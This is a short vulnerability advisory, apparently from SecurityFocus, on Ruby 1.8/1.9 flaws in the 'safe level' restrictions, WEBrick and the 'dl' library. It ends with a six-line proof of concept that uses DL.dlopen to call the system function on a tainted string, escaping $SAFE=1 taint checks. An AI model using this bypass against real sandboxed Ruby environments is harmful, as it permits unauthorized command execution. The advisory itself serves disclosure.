source: http://www.securityfocus.com/bid/30644/info
 
Ruby is prone to multiple vulnerabilities that can be leveraged to bypass security restrictions or cause a denial of service:
 
- Multiple security-bypass vulnerabilities occur because of errors in the 'safe level' restriction implementation. Attackers can leverage these issues to make insecure function calls and perform 'Syslog' operations.
 
- An error affecting 'WEBrick::HHTP::DefaultFileHandler' can exhaust system resources and deny service to legitimate users.
 
- A flaw in 'dl' can allow attackers to call unauthorized functions.
 
Attackers can exploit these issues to perform unauthorized actions on affected applications. This may aid in compromising the application and possibly the underlying computers. Attackers can also cause denial-of-service conditions.
 
These issues affect Ruby 1.8.5, 1.8.6-p286, 1.8.7-p71, and 1.9 r18423. Prior versions are also vulnerable. 

require 'dl'
$SAFE = 1
h = DL.dlopen(nil)
sys = h.sym('system', 'IP')
uname = 'uname -rs'.taint
sys[uname]
